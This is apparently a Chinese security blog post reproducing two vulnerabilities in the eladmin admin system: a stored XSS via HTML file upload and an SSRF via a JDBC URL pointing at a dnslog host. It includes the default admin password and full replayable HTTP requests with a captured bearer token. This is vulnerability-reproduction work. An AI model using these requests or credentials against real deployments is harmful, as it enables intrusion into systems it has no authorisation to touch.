---
title: eladmin-复现
date: 2024-09-09 09:32:57
tags:
---

# 0.github项目地址

[elunez/eladmin: eladmin jpa 版本：项目基于 Spring Boot 2.6.4、 Jpa、 Spring Security、Redis、Vue的前后端分离的后台管理系统，项目采用分模块开发方式， 权限控制采用 RBAC，支持数据字典与数据权限管理，支持一键生成前后端代码，支持动态路由 (github.com)](https://github.com/elunez/eladmin)

# 1.用默认密码登录后台

admin/123456

![image-20240909093504969](eladmin-复现/image-20240909093504969.png)

# CVE-2024-44676

XSS漏洞

## 1.找到文件存储功能

系统工具 - 存储股那里 - 文件上传

![image-20240909094917731](eladmin-复现/image-20240909094917731.png)

上传文件，数据包如下

```
POST /api/localStorage?name=111 HTTP/1.1
Host: localhost:8000
Content-Length: 204
sec-ch-ua: "Chromium";v="119", "Not?A_Brand";v="24"
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydm6xWQjws9AqeeBj
sec-ch-ua-mobile: ?0
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiJlMjZmYzFiNzQ1M2Q0ZjBlODg4NGRiNjQ3NDZjNmVmNCIsInVzZXIiOiJhZG1pbiIsInN1YiI6ImFkbWluIn0.IX5Benb8JGPsQ_jkpL5jMy3wmfq5YgOakx1tfV1064_QjwcRHAGg0lqDlwcFxRNlnBEvb0xZqCQbWsuGwUWyRQ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36
sec-ch-ua-platform: "Windows"
Accept: */*
Origin: http://localhost:8013
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8013/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundarydm6xWQjws9AqeeBj
Content-Disposition: form-data; name="file"; filename="1.html"
Content-Type: text/html

<script>alert(1)</script>
------WebKitFormBoundarydm6xWQjws9AqeeBj--

```

## 2.访问文件地址

如下图，出现弹窗，证明了存在xss漏洞

![image-20240909094818168](eladmin-复现/image-20240909094818168.png)

# CVE-2024-44677

SSRF漏洞

## 1.访问dnslog平台并申请域名

![image-20240909093611696](eladmin-复现/image-20240909093611696.png)

域名为 ae2a2f2773.ipv6.1433.eu.org.

## 2.在数据库管理中测试ssrf

testssrf.ae2a2f2773.ipv6.1433.eu.org.

漏洞点在 运维管理 - 数据库管理 - 新增数据库 - jdbc地址

![image-20240909094023940](eladmin-复现/image-20240909094023940.png)

数据包为

```
POST /api/database HTTP/1.1
Host: localhost:8013
Content-Length: 111
sec-ch-ua: "Chromium";v="119", "Not?A_Brand";v="24"
Accept: application/json, text/plain, */*
Content-Type: application/json
sec-ch-ua-mobile: ?0
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiJlMjZmYzFiNzQ1M2Q0ZjBlODg4NGRiNjQ3NDZjNmVmNCIsInVzZXIiOiJhZG1pbiIsInN1YiI6ImFkbWluIn0.IX5Benb8JGPsQ_jkpL5jMy3wmfq5YgOakx1tfV1064_QjwcRHAGg0lqDlwcFxRNlnBEvb0xZqCQbWsuGwUWyRQ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:8013
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8013/mnt/mnt/database
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: USER_NAME_COOKIE=admin; SID_1=6ff9d0e1; ELADMIN-TOEKN=Bearer%20eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiJlMjZmYzFiNzQ1M2Q0ZjBlODg4NGRiNjQ3NDZjNmVmNCIsInVzZXIiOiJhZG1pbiIsInN1YiI6ImFkbWluIn0.IX5Benb8JGPsQ_jkpL5jMy3wmfq5YgOakx1tfV1064_QjwcRHAGg0lqDlwcFxRNlnBEvb0xZqCQbWsuGwUWyRQ
Connection: close

{"id":null,"name":"11","jdbcUrl":"jdbc:mysql://testssrf.ae2a2f2773.ipv6.1433.eu.org.","userName":"1","pwd":"1"}
```

点击确定后能看到右上角提示新增成功

![image-20240909094257824](eladmin-复现/image-20240909094257824.png)

点击 jdbc 地址右侧的测试

![image-20240909094440434](eladmin-复现/image-20240909094440434.png)

数据包为

```
POST /api/database/testConnect HTTP/1.1
Host: localhost:8013
Content-Length: 253
sec-ch-ua: "Chromium";v="119", "Not?A_Brand";v="24"
Accept: application/json, text/plain, */*
Content-Type: application/json
sec-ch-ua-mobile: ?0
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiJlMjZmYzFiNzQ1M2Q0ZjBlODg4NGRiNjQ3NDZjNmVmNCIsInVzZXIiOiJhZG1pbiIsInN1YiI6ImFkbWluIn0.IX5Benb8JGPsQ_jkpL5jMy3wmfq5YgOakx1tfV1064_QjwcRHAGg0lqDlwcFxRNlnBEvb0xZqCQbWsuGwUWyRQ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:8013
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8013/mnt/mnt/database
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: USER_NAME_COOKIE=admin; SID_1=6ff9d0e1; ELADMIN-TOEKN=Bearer%20eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiJlMjZmYzFiNzQ1M2Q0ZjBlODg4NGRiNjQ3NDZjNmVmNCIsInVzZXIiOiJhZG1pbiIsInN1YiI6ImFkbWluIn0.IX5Benb8JGPsQ_jkpL5jMy3wmfq5YgOakx1tfV1064_QjwcRHAGg0lqDlwcFxRNlnBEvb0xZqCQbWsuGwUWyRQ
Connection: close

{"id":"3e070f45c072498299675b4f290137bd","name":"11","jdbcUrl":"jdbc:mysql://testssrf.ae2a2f2773.ipv6.1433.eu.org.","userName":"aaa","pwd":"111","createBy":"admin","createTime":"2024-09-09 09:42:42","updateBy":"admin","updateTime":"2024-09-09 09:44:21"}
```

回到dndlog平台，如下图所示，有dns请求解析记录，证明了ssrf漏洞

![image-20240909094520768](eladmin-复现/image-20240909094520768.png)
